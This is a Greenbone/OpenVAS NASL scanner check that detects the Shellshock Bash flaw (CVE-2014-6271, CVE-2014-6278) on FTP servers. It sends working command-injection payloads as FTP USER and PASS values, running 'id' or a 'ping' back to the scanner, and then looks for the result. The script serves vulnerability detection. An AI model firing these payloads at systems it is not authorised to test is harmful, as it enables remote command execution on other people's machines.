if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105094" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_cve_id( "CVE-2014-6271", "CVE-2014-6278" );
	script_bugtraq_id( 70103 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)" );
	script_name( "GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)" );
	script_tag( name: "summary", value: "This host is installed with GNU Bash Shell
  and is prone to remote command execution vulnerability." );
	script_tag( name: "vuldetect", value: "Send a FTP login request and check remote command execution." );
	script_tag( name: "insight", value: "GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote or local attackers to
  inject  shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector." );
	script_tag( name: "affected", value: "GNU Bash through 4.3" );
	script_tag( name: "solution", value: "Apply the patch or upgrade to latest version." );
	script_xref( name: "URL", value: "https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc" );
	script_xref( name: "URL", value: "https://access.redhat.com/solutions/1207723" );
	script_xref( name: "URL", value: "https://bugzilla.redhat.com/show_bug.cgi?id=1141597" );
	script_xref( name: "URL", value: "https://blogs.akamai.com/2014/09/environment-bashing.html" );
	script_xref( name: "URL", value: "https://community.qualys.com/blogs/securitylabs/2014/09/24/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/banner/available" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
id_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;",
	 "() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }" );
port = ftp_get_port( default: 21 );
for id_user in id_users {
	id_pass = id_user;
	soc = ftp_open_socket( port: port );
	if(!soc){
		break;
	}
	send( socket: soc, data: "USER " + id_user + "\r\n" );
	recv = recv( socket: soc, length: 1024 );
	send( socket: soc, data: "PASS " + id_pass + "\r\n" );
	recv += recv( socket: soc, length: 1024 );
	ftp_close( socket: soc );
	if(IsMatchRegexp( recv, "uid=[0-9]+.*gid=[0-9]+.*" )){
		VULN = TRUE;
		break;
	}
}
if(!VULN){
	vtstrings = get_vt_strings();
	str = vtstrings["ping_string"];
	pattern = hexstr( str );
	p_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + this_host(),
		 "{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + this_host() + "; }" );
	for user in p_users {
		soc = ftp_open_socket( port: port );
		if(!soc){
			break;
		}
		pass = user;
		send( socket: soc, data: "USER " + user + "\r\n" );
		recv = recv( socket: soc, length: 1024 );
		send( socket: soc, data: "PASS " + pass + "\r\n" );
		res = send_capture( socket: soc, data: "", pcap_filter: NASLString( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
		ftp_close( socket: soc );
		if(!res){
			continue;
		}
		data = get_icmp_element( icmp: res, element: "data" );
		if(ContainsString( data, str )){
			VULN = TRUE;
			break;
		}
	}
}
if(VULN){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

